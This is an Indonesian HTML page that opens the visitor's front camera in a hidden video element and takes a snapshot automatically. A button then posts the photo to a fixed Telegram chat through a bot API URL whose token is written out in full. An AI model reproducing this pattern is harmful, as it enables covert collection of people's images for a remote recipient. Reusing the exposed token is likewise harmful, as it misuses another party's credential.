<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ambil dan Kirim Foto</title>
  <style>
    body { text-align: center; font-family: Arial, sans-serif; }
    video, img { max-width: 100%; height: auto; }
    button { padding: 10px; margin: 10px; background-color: #007bff; color: white; border: none; border-radius: 5px; }
  </style>
</head>
<body>
  <h2>Ambil dan Kirim Foto ke Telegram</h2>
  <video id="video" autoplay style="display:none;"></video><br>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="photo" src="" style="display:none;"><br>
  <button onclick="uploadToTelegram()" style="display:none;" id="sendButton">Kirim ke Telegram</button>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photo = document.getElementById('photo');
    const sendButton = document.getElementById('sendButton');
    let stream;

    // Akses kamera depan
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(s => {
        stream = s;
        video.srcObject = s;
        // Tunggu video siap, lalu ambil foto
        video.onloadedmetadata = () => {
          takePicture();
        };
      })
      .catch(err => alert('Error akses kamera: ' + err));

    // Ambil foto
    function takePicture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      photo.src = canvas.toDataURL('image/png');
      photo.style.display = 'block';
      sendButton.style.display = 'block';
      // Hentikan kamera setelah foto diambil
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      video.style.display = 'none';
    }

    // Kirim ke Telegram
    async function uploadToTelegram() {
      const blob = await (await fetch(photo.src)).blob();
      const formData = new FormData();
      formData.append('chat_id', '1805764667');
      formData.append('photo', blob, 'photo.png');

      fetch('https://api.telegram.org/bot7562937806:AAHBtsb8fMahmwFrG-C0CMucbInQrfHZOeE/sendPhoto', {
        method: 'POST',
        body: formData
      })
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert('Foto berhasil dikirim!');
          } else {
            alert('Gagal mengirim foto: ' + data.description);
          }
        })
        .catch(err => alert('Error: ' + err));
    }
  </script>
</body>
</html>
